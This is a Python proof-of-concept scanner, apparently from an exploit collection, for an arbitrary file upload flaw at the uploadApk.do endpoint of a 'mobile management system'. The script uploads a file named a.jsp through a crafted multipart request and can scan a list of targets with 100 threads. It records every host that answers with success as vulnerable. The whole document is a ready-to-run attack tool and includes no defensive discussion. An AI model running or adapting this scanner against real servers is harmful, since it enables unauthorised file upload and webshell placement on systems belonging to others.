#移动管理系统 uploadApk.do 任意文件上传漏洞
#导包外置
import requests,argparse,sys
from multiprocessing.dummy import Pool
# 关闭告警
requests.packages.urllib3.disable_warnings()

def banner():
    test = """             _                 _   _      ___      
 _   _ _ __ | | ___   __ _  __| | /_\    / _ \/\ /\
| | | | '_ \| |/ _ \ / _` |/ _` |//_\\  / /_)/ //_/
| |_| | |_) | | (_) | (_| | (_| /  _  \/ ___/ __ \ 
 \__,_| .__/|_|\___/ \__,_|\__,_\_/ \_/\/   \/  \/ 
      |_|                                          
                                                          author :CHKer
                                                          version:1.0.0
  """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="移动管理系统 uploadApk.do 任意文件上传漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help=' input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = "/maportal/appmanager/uploadApk.do?pk_obj="
    headers = {
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Cookie': 'JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server',
        'Connection': 'close'

    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    data ="""------WebKitFormBoundaryvLTG6zlX0gZ8LzO3
Content-Disposition: form-data; name="downloadpath"; filename="a.jsp"
Content-Type: application/msword

hello"""
    
    try:
        res1 = requests.post(url=target+payload,headers=headers,data=data,timeout=10,verify=False,proxies=proxies)
        if res1.status_code == 200:
            print(f"[+]该url:{target}存在漏洞")
            with open('result41.txt','a', encoding='utf-8') as fp:
                fp.write(f"{target}"+"\n")
        else:
            print(f'[-]该url:{target}不存在漏洞')
    except:
        print(f'[-]该url:{target}该站点存在问题')

if __name__ == '__main__':
    main()